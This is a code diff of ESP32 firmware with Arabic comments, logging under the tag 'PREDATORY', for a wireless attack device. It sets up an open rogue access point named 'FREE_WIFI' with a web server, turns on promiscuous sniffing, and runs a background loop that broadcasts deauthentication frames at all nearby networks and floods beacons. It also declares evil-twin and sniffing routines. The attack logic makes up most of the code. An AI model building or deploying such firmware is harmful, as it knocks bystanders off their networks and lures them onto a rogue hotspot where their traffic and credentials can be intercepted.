@@ -6,70 +6,95 @@
 #include "esp_event.h"
 #include "nvs_flash.h"
 #include "esp_netif.h"
+#include "esp_log.h"
 
-// تعريف الدوال المساعدة
+static const char *TAG = "PREDATORY";
+
+// دوال الهجمات
 void deauth_attack(uint8_t *bssid);
 void beacon_flood(char *ssid);
 void start_sniffing(void);
 void evil_twin_start(char *target_ssid);
 void rickroll_start(void);
+void start_web_server(void);
 
-// دالة الهجمات التي تعمل في الخلفية
+// دوال معالجة الأوامر
+void handle_deauth(void);
+void handle_beacon(void);
+void handle_sniff(void);
+void handle_evil_twin(void);
+void handle_rickroll(void);
+
+// مهمة الهجمات الرئيسية
 void attack_loop(void *pv) {
     while(1) {
-        // هجوم قطع الاتصال (Deauth) على الشبكات المجاورة
         uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         deauth_attack(bssid);
-        
-        // إغراق المنطقة بإطارات Beacon لشبكة FREE_WIFI
         beacon_flood("FREE_WIFI");
-        
-        vTaskDelay(100 / portTICK_PERIOD_MS);
+        vTaskDelay(500 / portTICK_PERIOD_MS);
     }
 }
 
-// دالة تشغيل نقطة الوصول (AP) الخاصة بنا
+// تشغيل نقطة الوصول
 void start_ap(void) {
     wifi_config_t ap_config = {
         .ap = {
-            .ssid = "FREE_WIFI",        // اسم الشبكة التي ستظهر
+            .ssid = "FREE_WIFI",
             .ssid_len = 9,
-            .password = "",             // شبكة مفتوحة بدون كلمة مرور
-            .channel = 6,               // القناة 6
-            .authmode = WIFI_AUTH_OPEN, // وضع المصادقة مفتوح
+            .password = "",
+            .channel = 6,
+            .authmode = WIFI_AUTH_OPEN,
             .max_connection = 4,
         },
     };
-
-    // تغيير وضع الـ WiFi إلى AP (نقطة وصول)
+    
+    ESP_LOGI(TAG, "Starting AP...");
     esp_wifi_set_mode(WIFI_MODE_AP);
-    // تطبيق الإعدادات على واجهة AP
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    // تشغيل الـ WiFi
     esp_wifi_start();
+    ESP_LOGI(TAG, "AP Started: FREE_WIFI");
 }
 
 void app_main(void) {
-    // تهيئة الذاكرة والشبكة
-    nvs_flash_init();
-    esp_netif_init();
-    esp_event_loop_create_default();
-
-    // تهيئة الـ WiFi بالإعدادات الافتراضية
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
+    ESP_LOGI(TAG, "App starting...");
     
-    // --- الخطوة الأهم: تشغيل نقطة الوصول (AP) ---
-    start_ap(); // سيؤدي هذا إلى ظهور شبكة FREE_WIFI
-
-    // تأخير بسيط للتأكد من استقرار الشبكة قبل تفعيل وضع التنصت
-    vTaskDelay(1000 / portTICK_PERIOD_MS);
-
-    // تفعيل وضع التنصت (Promiscuous) للسماح بإرسال حزم مخصصة
+    // تهيئة NVS مع مسح تلقائي عند التلف
+    esp_err_t ret = nvs_flash_init();
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+        ESP_LOGI(TAG, "Erasing NVS...");
+        ESP_ERROR_CHECK(nvs_flash_erase());
+        ret = nvs_flash_init();
+    }
+    ESP_ERROR_CHECK(ret);
+    
+    // تهيئة الشبكة
+    ESP_LOGI(TAG, "Initializing network...");
+    ESP_ERROR_CHECK(esp_netif_init());
+    ESP_ERROR_CHECK(esp_event_loop_create_default());
+    
+    // تهيئة WiFi مع تحسينات
+    ESP_LOGI(TAG, "Initializing WiFi...");
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    
+    // تشغيل AP
+    start_ap();
+    
+    // تشغيل خادم الويب
+    ESP_LOGI(TAG, "Starting web server...");
+    start_web_server();
+    
+    // تأخير للتأكد من استقرار الشبكة
+    vTaskDelay(2000 / portTICK_PERIOD_MS);
+    
+    // تفعيل وضع التنصت مع تحسينات
+    ESP_LOGI(TAG, "Enabling promiscuous mode...");
     esp_wifi_set_promiscuous(true);
-    // ضبط القناة التي سيعمل عليها الجهاز
     esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
-
-    // إنشاء المهمة الرئيسية التي ستقوم بتشغيل الهجمات في الخلفية
+    
+    // تشغيل الهجمات
+    ESP_LOGI(TAG, "Starting attacks...");
     xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
+    
+    ESP_LOGI(TAG, "System ready! Connect to FREE_WIFI and visit 192.168.4.1");
 }
